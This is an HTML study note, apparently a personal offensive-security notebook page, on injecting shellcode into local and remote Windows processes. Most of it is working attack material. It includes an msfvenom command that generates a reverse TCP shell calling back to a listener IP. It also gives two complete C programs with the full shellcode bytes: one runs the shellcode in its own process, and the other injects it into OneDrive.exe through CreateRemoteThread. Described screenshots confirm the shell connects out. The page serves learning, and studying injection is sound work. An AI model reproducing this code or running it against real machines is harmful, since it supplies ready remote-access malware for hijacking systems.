<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Write shellcode into local/remote process' memory</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Shellcode - Write shellcode into memory of local &amp; remote processes</h1></strong><br /><br /><strong>References</strong><br />• <a href="https://ired.team/offensive-security/code-injection-process-injection/process-injection">https://ired.team/offensive-security/code-injection-process-injection/process-injection</a><br /><br /><strong><h2>## Observations</h2></strong><br />• Static Analysis<br />   ◇ If shellcode isn&#39;t encoded/encrypted at all -&gt; antivirus will detect the .exe as malicious on disk<br /><br /><strong><h2>## Write Shellcode into Local Process</h2></strong><br />Generate some shellcode<br /><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.58.142 LPORT=443 -f c -b &quot;\x00\x0a\x0d&quot;</code><br /><br />Code breakdown:<br />1. <code>VirtuaAlloc</code> - Allocate memory block to store shellcode in<br />2. <code>memcpy</code> - Copy shellcode to allocated memory block<br />3. <code>((void(*)())pShellcodeBaseAddress)();</code> - Execute shellcode from memory (no idea wtf how)<br /><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;Windows.h&gt;<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;msfvenom&nbsp;-p&nbsp;windows/shell_reverse_tcp&nbsp;LHOST=192.168.58.142&nbsp;LPORT=443&nbsp;-f&nbsp;c&nbsp;-b&nbsp;&quot;\x00\x0a\x0d&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;351&nbsp;(iteration=0)<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Payload&nbsp;size:&nbsp;351&nbsp;bytes<br />&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;shellcode[]&nbsp;=&nbsp;&nbsp;&quot;\xdb\xcb\xbb\xba\xa6\x47\xc6\xd9\x74\x24\xf4\x58\x33\xc9\xb1&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x52\x83\xe8\xfc\x31\x58\x13\x03\xe2\xb5\xa5\x33\xee\x52\xab&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xbc\x0e\xa3\xcc\x35\xeb\x92\xcc\x22\x78\x84\xfc\x21\x2c\x29&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x76\x67\xc4\xba\xfa\xa0\xeb\x0b\xb0\x96\xc2\x8c\xe9\xeb\x45&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x0f\xf0\x3f\xa5\x2e\x3b\x32\xa4\x77\x26\xbf\xf4\x20\x2c\x12&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xe8\x45\x78\xaf\x83\x16\x6c\xb7\x70\xee\x8f\x96\x27\x64\xd6&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x38\xc6\xa9\x62\x71\xd0\xae\x4f\xcb\x6b\x04\x3b\xca\xbd\x54&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xc4\x61\x80\x58\x37\x7b\xc5\x5f\xa8\x0e\x3f\x9c\x55\x09\x84&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xde\x81\x9c\x1e\x78\x41\x06\xfa\x78\x86\xd1\x89\x77\x63\x95&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xd5\x9b\x72\x7a\x6e\xa7\xff\x7d\xa0\x21\xbb\x59\x64\x69\x1f&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xc3\x3d\xd7\xce\xfc\x5d\xb8\xaf\x58\x16\x55\xbb\xd0\x75\x32&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x08\xd9\x85\xc2\x06\x6a\xf6\xf0\x89\xc0\x90\xb8\x42\xcf\x67&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xbe\x78\xb7\xf7\x41\x83\xc8\xde\x85\xd7\x98\x48\x2f\x58\x73&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x88\xd0\x8d\xd4\xd8\x7e\x7e\x95\x88\x3e\x2e\x7d\xc2\xb0\x11&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x9d\xed\x1a\x3a\x34\x14\xcd\x85\x61\x2c\x83\x6e\x70\x50\x9a&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xd5\xfd\xb6\xf6\x39\xa8\x61\x6f\xa3\xf1\xf9\x0e\x2c\x2c\x84&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x11\xa6\xc3\x79\xdf\x4f\xa9\x69\x88\xbf\xe4\xd3\x1f\xbf\xd2&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x7b\xc3\x52\xb9\x7b\x8a\x4e\x16\x2c\xdb\xa1\x6f\xb8\xf1\x98&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xd9\xde\x0b\x7c\x21\x5a\xd0\xbd\xac\x63\x95\xfa\x8a\x73\x63&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x02\x97\x27\x3b\x55\x41\x91\xfd\x0f\x23\x4b\x54\xe3\xed\x1b&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x21\xcf\x2d\x5d\x2e\x1a\xd8\x81\x9f\xf3\x9d\xbe\x10\x94\x29&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xc7\x4c\x04\xd5\x12\xd5\x34\x9c\x3e\x7c\xdd\x79\xab\x3c\x80&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x79\x06\x02\xbd\xf9\xa2\xfb\x3a\xe1\xc7\xfe\x07\xa5\x34\x73&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x17\x40\x3a\x20\x18\x41&quot;;<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;allocate&nbsp;memory&nbsp;block&nbsp;to&nbsp;store&nbsp;shellcode&nbsp;in<br />&nbsp;&nbsp;&nbsp;&nbsp;void&nbsp;*pShellcodeBaseAddress&nbsp;=&nbsp;VirtualAlloc(0,&nbsp;sizeof(shellcode),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;copy&nbsp;shellcode&nbsp;into&nbsp;memory<br />&nbsp;&nbsp;&nbsp;&nbsp;memcpy(pShellcodeBaseAddress,&nbsp;shellcode,&nbsp;sizeof(shellcode));<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;execute&nbsp;shellcode&nbsp;from&nbsp;memory<br />&nbsp;&nbsp;&nbsp;&nbsp;((void(*)())pShellcodeBaseAddress)();<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br />In Process Hacker we see the process - <code>main.exe</code> - has started<br /><a href=""><img src="images/1859-1.png" alt="images/1859-1.png" /></a><br /><br />In the network tab we see it&#39;s made a connection to the listener at <code>192.168.58.142</code> on port <code>443</code><br /><a href=""><img src="images/1859-2.png" alt="images/1859-2.png" /></a><br /><br /><a href=""><img src="images/1859-3.png" alt="images/1859-3.png" /></a><br /><br /><strong><h2>## Write Shellcode into Remote Process</h2></strong><br />Same as above, except slightly different code because working with remote processes.<br /><br /><strong><h3>### Observations</h3></strong><br />• Think you need sufficient permissions on the target process for PROCESS_ALL_ACCESS and allocating memory to work<br />   ◇ OneDrive.exe worked consistently<br />   ◇ but running as Administrator and against othe processes didn&#39;t seem to work<br /><br />Code breakdown:<br />1. <code>OpenProcess</code> - to get handle to remote process<br />2. <code>VirtuaAllocEx</code> - allocate memory block in remote process to store shellcode in<br />3. <code>WriteProcessMemory</code> - copy shellcode into remote process&#39; memory<br />4. <code>CreateRemoteThread</code> - execute shellcode by creating remote thread in target process at shellcode base address<br />5. <code>CloseHandle</code> - clean up<br /><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;msfvenom&nbsp;-p&nbsp;windows/shell_reverse_tcp&nbsp;LHOST=192.168.58.142&nbsp;LPORT=443&nbsp;-f&nbsp;c&nbsp;-b&nbsp;&quot;\x00\x0a\x0d&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;351&nbsp;(iteration=0)<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Payload&nbsp;size:&nbsp;351&nbsp;bytes<br />&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;shellcode[]&nbsp;=&nbsp;&nbsp;&quot;\xdb\xcb\xbb\xba\xa6\x47\xc6\xd9\x74\x24\xf4\x58\x33\xc9\xb1&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x52\x83\xe8\xfc\x31\x58\x13\x03\xe2\xb5\xa5\x33\xee\x52\xab&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xbc\x0e\xa3\xcc\x35\xeb\x92\xcc\x22\x78\x84\xfc\x21\x2c\x29&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x76\x67\xc4\xba\xfa\xa0\xeb\x0b\xb0\x96\xc2\x8c\xe9\xeb\x45&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x0f\xf0\x3f\xa5\x2e\x3b\x32\xa4\x77\x26\xbf\xf4\x20\x2c\x12&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xe8\x45\x78\xaf\x83\x16\x6c\xb7\x70\xee\x8f\x96\x27\x64\xd6&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x38\xc6\xa9\x62\x71\xd0\xae\x4f\xcb\x6b\x04\x3b\xca\xbd\x54&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xc4\x61\x80\x58\x37\x7b\xc5\x5f\xa8\x0e\x3f\x9c\x55\x09\x84&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xde\x81\x9c\x1e\x78\x41\x06\xfa\x78\x86\xd1\x89\x77\x63\x95&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xd5\x9b\x72\x7a\x6e\xa7\xff\x7d\xa0\x21\xbb\x59\x64\x69\x1f&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xc3\x3d\xd7\xce\xfc\x5d\xb8\xaf\x58\x16\x55\xbb\xd0\x75\x32&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x08\xd9\x85\xc2\x06\x6a\xf6\xf0\x89\xc0\x90\xb8\x42\xcf\x67&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xbe\x78\xb7\xf7\x41\x83\xc8\xde\x85\xd7\x98\x48\x2f\x58\x73&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x88\xd0\x8d\xd4\xd8\x7e\x7e\x95\x88\x3e\x2e\x7d\xc2\xb0\x11&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x9d\xed\x1a\x3a\x34\x14\xcd\x85\x61\x2c\x83\x6e\x70\x50\x9a&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xd5\xfd\xb6\xf6\x39\xa8\x61\x6f\xa3\xf1\xf9\x0e\x2c\x2c\x84&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x11\xa6\xc3\x79\xdf\x4f\xa9\x69\x88\xbf\xe4\xd3\x1f\xbf\xd2&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x7b\xc3\x52\xb9\x7b\x8a\x4e\x16\x2c\xdb\xa1\x6f\xb8\xf1\x98&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xd9\xde\x0b\x7c\x21\x5a\xd0\xbd\xac\x63\x95\xfa\x8a\x73\x63&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x02\x97\x27\x3b\x55\x41\x91\xfd\x0f\x23\x4b\x54\xe3\xed\x1b&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x21\xcf\x2d\x5d\x2e\x1a\xd8\x81\x9f\xf3\x9d\xbe\x10\x94\x29&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xc7\x4c\x04\xd5\x12\xd5\x34\x9c\x3e\x7c\xdd\x79\xab\x3c\x80&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x79\x06\x02\xbd\xf9\xa2\xfb\x3a\xe1\xc7\xfe\x07\xa5\x34\x73&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x17\x40\x3a\x20\x18\x41&quot;;<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;pid&nbsp;=&nbsp;6756;<br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Injecting&nbsp;into&nbsp;PID:&nbsp;%i&nbsp;\n&quot;,&nbsp;pid);<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;open&nbsp;handle&nbsp;to&nbsp;remote&nbsp;process<br />&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hTargetProcess&nbsp;=&nbsp;OpenProcess(PROCESS_ALL_ACCESS,&nbsp;FALSE,&nbsp;pid);<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;allocate&nbsp;memory&nbsp;in&nbsp;remote&nbsp;process<br />&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;pRemoteBuffer&nbsp;=&nbsp;VirtualAllocEx(hTargetProcess,&nbsp;NULL,&nbsp;sizeof(shellcode),&nbsp;(MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT),&nbsp;PAGE_EXECUTE_READWRITE);<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;copy&nbsp;shellcode&nbsp;into&nbsp;remote&nbsp;process&#39;&nbsp;memory<br />&nbsp;&nbsp;&nbsp;&nbsp;WriteProcessMemory(hTargetProcess,&nbsp;pRemoteBuffer,&nbsp;shellcode,&nbsp;sizeof(shellcode),&nbsp;NULL);<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;execute&nbsp;shellcode&nbsp;by&nbsp;creating&nbsp;remote&nbsp;thread&nbsp;in&nbsp;target&nbsp;process&nbsp;at&nbsp;shellcode&nbsp;base&nbsp;address<br />&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hRemoteThread&nbsp;=&nbsp;CreateRemoteThread(hTargetProcess,&nbsp;NULL,&nbsp;0,&nbsp;(LPTHREAD_START_ROUTINE)pRemoteBuffer,&nbsp;NULL,&nbsp;0,&nbsp;NULL);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hTargetProcess);<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br />OneDrive&#39;s PID is 6756.<br />There&#39;s currently no sub-threads/processes.<br /><a href=""><img src="images/1859-4.png" alt="images/1859-4.png" /></a><br /><br />Run our code, and OneDrive is now running <code>cmd.exe</code><br /><a href=""><img src="images/1859-5.png" alt="images/1859-5.png" /></a><br /><br />It has an active connection to a remote host.<br /><a href=""><img src="images/1859-6.png" alt="images/1859-6.png" /></a><br /><br /><a href=""><img src="images/1859-7.png" alt="images/1859-7.png" /></a></div>
</body>
</html>
